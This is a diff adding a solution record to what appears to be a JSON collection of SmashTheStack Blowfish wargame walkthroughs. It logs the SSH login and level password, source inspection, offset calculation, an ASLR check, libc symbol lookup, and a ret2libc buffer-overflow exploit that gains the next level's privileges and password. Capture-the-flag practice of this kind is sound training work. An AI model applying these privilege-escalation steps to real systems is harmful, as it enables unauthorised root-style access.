@@ -306,6 +306,76 @@
     }
    ],
    "note": "snprintf buffer2 overflow (ret at buffer2+2060); libc jmp esp gadget (ASLR off) removes address guessing. badfunc takes (argv[2], argv[1]) - the overflow travels in argv[1]. Verified live 2026-11-25."
+  },
+  {
+   "lvl": 7,
+   "user": "level7",
+   "pw": "g00d_j0b",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level7@blowfish.smashthestack.org",
+     "out": [
+      "level7@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "whoami",
+     "out": [
+      "level7"
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      "There is another overflow in  /levels/level7",
+      "Exploit it and get the level8 pass."
+     ]
+    },
+    {
+     "cmd": "cat /levels/level7.c",
+     "out": [
+      "for(i = 1; i < argc; i++) memset(argv[i], 0, strlen(argv[i]));",
+      "strstr(argv[0], key2..key5): rejects 0x90/0xeb/0xcd/0xff",
+      "strcpy(buffer, argv[0]);"
+     ]
+    },
+    {
+     "cmd": "objdump -d --no-show-raw-insn /levels/level7 | grep -B4 'call   80483b4 <strcpy@plt>'",
+     "out": [
+      "lea -0x38(%ebp),%eax ... call strcpy@plt",
+      "(buffer at ebp-0x38 -> ret at offset 60)"
+     ]
+    },
+    {
+     "cmd": "cat /proc/sys/kernel/randomize_va_space; cat /proc/self/maps | grep libc-2.7.so | head -2",
+     "out": [
+      "0",
+      "b7e9d000-b7fd5000 r-xp ... /lib/libc-2.7.so"
+     ]
+    },
+    {
+     "cmd": "nm -D /lib/libc-2.7.so | grep -E 'W (system|setuid)$|T (strcpy|execl)$'",
+     "out": [
+      "00037eb0 W system",
+      "000711f0 T strcpy"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/e_bf7.py",
+     "out": [
+      "(ret2libc: A*60 + strcpy@libc + system@libc + dst 0xb7fd7001 + \"/bin/sh\" ptr; pipe-fed id + cat /pass/level8)",
+      "[New] 45L, 1692C written"
+     ]
+    },
+    {
+     "cmd": "python /dev/shm/e_bf7.py",
+     "out": [
+      "uid=1007(level7) gid=1007(level7) euid=1008(level8) groups=1007(level7)",
+      "w3ll_d0n3!"
+     ]
+    }
+   ],
+   "note": "argv[0]-based strcpy overflow with byte filter (no 90/eb/cd/ff in argv[0]); argv[1+] zeroed by memset. ret2libc with byte-legal libc addresses (ASLR off): strcpy builds /bin/sh in libc's writable page, then system(dst). Verified live 2026-11-25."
   }
  ],
  "goals": {}
